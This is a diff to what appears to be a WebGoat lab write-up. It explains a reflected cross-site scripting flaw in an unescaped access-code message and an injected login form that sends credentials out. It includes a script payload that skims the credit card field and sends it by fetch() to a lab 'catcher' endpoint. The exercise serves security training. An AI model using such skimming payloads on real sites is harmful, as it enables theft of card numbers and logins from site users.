@@ -5,3 +5,22 @@ Part 1 Explanation:
 A form is injected with username, password, and a login field. A script is added
 which adds an event listener to the submit event of the form, which then sends
 a GET request to the required URL with the contents of the form.
+
+Part 2 Explanation:
+The server does input validation for the three digit access code. If it is
+invalid, it displays a message with the invalid content to notify the user.
+However, this is not escaped so HTML/JS inside this would be rendered/run by
+the browser.
+
+The script removes the message and sets the three digit access code as the
+default, so as to imitate the original screen. It adds an event listener to the
+form which sends a GET request with the credit card number on submit.
+
+<script>
+	document.getElementByID('message').remove();
+	const form = document.form;
+	form.addEventListener('submit', (event) => {
+		fetch(`http://localhost:8090/WebGoat/catcher?PROPERTY=yes&stolen-credit-card=${form.input1.value}`);
+	});
+	form.input2.value = '000';
+</script>
